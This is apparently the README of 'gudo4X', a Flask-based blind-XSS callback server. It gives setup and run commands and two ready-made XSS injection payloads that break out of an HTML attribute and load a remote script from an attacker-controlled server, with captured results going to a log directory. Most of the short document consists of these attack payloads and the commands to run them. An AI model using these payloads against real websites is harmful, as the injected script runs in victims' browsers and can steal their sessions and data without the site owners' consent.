## gudo4X - guide dog for xss

### usage
* install flask and magic

```bash
sudo apt update && sudo apt install -y python3-flask python3-magic
```

* (for https) put cert files in project directory (cert.pem, key.pem)

* run:

```bash
sudo bash run.sh
```

* send the script in a xss:
```html
'"><script/src=https://yourserver/a.js></script>
```

```html
'"><svg/onload=body.appendChild(document.createElement`script`).src="https://yourserver/a.js">
```

* see the log directory
